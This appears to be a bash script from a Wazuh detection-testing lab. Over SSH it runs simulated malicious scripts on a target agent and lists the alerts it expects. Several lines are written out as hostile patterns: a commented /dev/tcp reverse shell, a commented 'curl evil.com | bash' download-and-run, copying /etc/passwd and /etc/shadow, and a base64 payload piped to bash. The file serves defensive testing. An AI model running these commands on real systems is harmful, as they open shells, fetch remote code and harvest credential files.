#!/bin/bash
#===============================================================================
# Attack #06: Suspicious Script Execution
# Category: Malware
# Expected Wazuh Rules: 5903 (lvl3)
# Expected Level: 3 (observed)
# MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="06"
ATTACK_NAME="Suspicious Script Execution"
ATTACK_CATEGORY="Malware"

TARGET="${1:-$TARGET_IP}"

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: $TARGET"
echo "Category: $ATTACK_CATEGORY"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo ""

ATTACK_COMMANDS='
#!/bin/bash
echo "[*] Suspicious script execution attack..."

# 1. Create and execute script from /tmp (suspicious location)
echo "[*] Creating suspicious scripts in /tmp..."

# Reverse shell script (will not actually connect)
cat > /tmp/reverse_shell.sh << "SCRIPT"
#!/bin/bash
# Simulated reverse shell - does not actually connect
echo "Attempting connection to attacker..."
# bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
sleep 1
echo "Connection simulation complete"
SCRIPT
chmod +x /tmp/reverse_shell.sh

# Data exfiltration script
cat > /tmp/exfil.sh << "SCRIPT"
#!/bin/bash
# Simulated data exfiltration
echo "Collecting sensitive data..."
cat /etc/passwd > /tmp/stolen_data.txt 2>/dev/null
cat /etc/shadow >> /tmp/stolen_data.txt 2>/dev/null
echo "Data collection complete"
SCRIPT
chmod +x /tmp/exfil.sh

# Cryptominer simulation
cat > /tmp/miner.sh << "SCRIPT"
#!/bin/bash
# Simulated cryptominer
echo "Starting mining simulation..."
for i in {1..5}; do
    echo "Mining block $i..."
    sleep 1
done
echo "Mining simulation complete"
SCRIPT
chmod +x /tmp/miner.sh

# Keylogger simulation
cat > /tmp/keylogger.py << "SCRIPT"
#!/usr/bin/env python3
# Simulated keylogger - does not actually log keys
print("Keylogger simulation started")
import time
time.sleep(2)
print("Keylogger simulation ended")
SCRIPT
chmod +x /tmp/keylogger.py

# 2. Execute suspicious scripts
echo ""
echo "[*] Executing suspicious scripts..."

echo "  Running reverse_shell.sh..."
/tmp/reverse_shell.sh 2>/dev/null

echo "  Running exfil.sh..."
/tmp/exfil.sh 2>/dev/null

echo "  Running miner.sh..."
/tmp/miner.sh 2>/dev/null

if command -v python3 &> /dev/null; then
    echo "  Running keylogger.py..."
    python3 /tmp/keylogger.py 2>/dev/null
fi

# 3. Execute base64 encoded commands (common evasion technique)
echo ""
echo "[*] Executing base64 encoded commands..."
# Encoded: echo "suspicious command executed"
echo "ZWNobyAic3VzcGljaW91cyBjb21tYW5kIGV4ZWN1dGVkIgo=" | base64 -d | bash

# 4. Download and execute pattern
echo ""
echo "[*] Simulating download and execute pattern..."
# curl http://evil.com/malware.sh | bash  # Commented for safety
echo "curl http://evil.com/malware.sh | bash" > /tmp/download_exec.log

# 5. Execute script with suspicious arguments
echo ""
echo "[*] Running commands with suspicious patterns..."
bash -c "whoami && id && uname -a"
bash -c "cat /etc/passwd | head -5"

# 6. Create persistence mechanism simulation
echo ""
echo "[*] Simulating persistence mechanism..."
cat > /tmp/persistence.sh << "SCRIPT"
#!/bin/bash
# Simulated persistence - adds to bashrc (will be removed)
echo "echo persistence_check" >> ~/.bashrc_backup_test
SCRIPT
chmod +x /tmp/persistence.sh
/tmp/persistence.sh 2>/dev/null

echo ""
echo "[*] Waiting for detection..."
sleep 10

# Cleanup
echo "[*] Cleaning up..."
rm -f /tmp/reverse_shell.sh /tmp/exfil.sh /tmp/miner.sh /tmp/keylogger.py
rm -f /tmp/stolen_data.txt /tmp/download_exec.log /tmp/persistence.sh
rm -f ~/.bashrc_backup_test 2>/dev/null

echo "[*] Cleanup complete"
'

echo "[*] Commands to run on target agent:"
echo ""
echo "$ATTACK_COMMANDS"


TARGET="${1:-$TARGET_IP}"
SSH_KEY_RAW="${SSH_KEY_OVERRIDE:-${TARGET_SSH_KEY:-$HOME/.ssh/wazuh-agent.pem}}"
SSH_USER="${3:-${TARGET_USER:-ubuntu}}"
SSH_KEY="${SSH_KEY_RAW/#\~/$HOME}"



if [ -n "$SSH_KEY" ] && [ -f "$SSH_KEY" ]; then
    echo "[*] Running attack via SSH using key $SSH_KEY ..."
    ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$TARGET" "$ATTACK_COMMANDS"
else
    echo -e "${YELLOW}[!] Cannot connect to target. Printing commands to run manually:${NC}"
    echo ""
    echo "--- Run these commands on the target agent ---"
    echo "$ATTACK_COMMANDS"
    echo "--- End of commands ---"
fi

END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack script generated${NC}"
echo "==============================================================================="
echo "Start Time: $START_TIMESTAMP"
echo "End Time: $END_TIMESTAMP"
echo ""
echo "Expected Wazuh alerts:"
echo "  - Rule 5902: Suspicious script execution"
echo "  - Rule 5903: Script execution from /tmp"
echo "  - Rule 80790: Base64 command execution"
echo "  - Audit rules for command execution"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
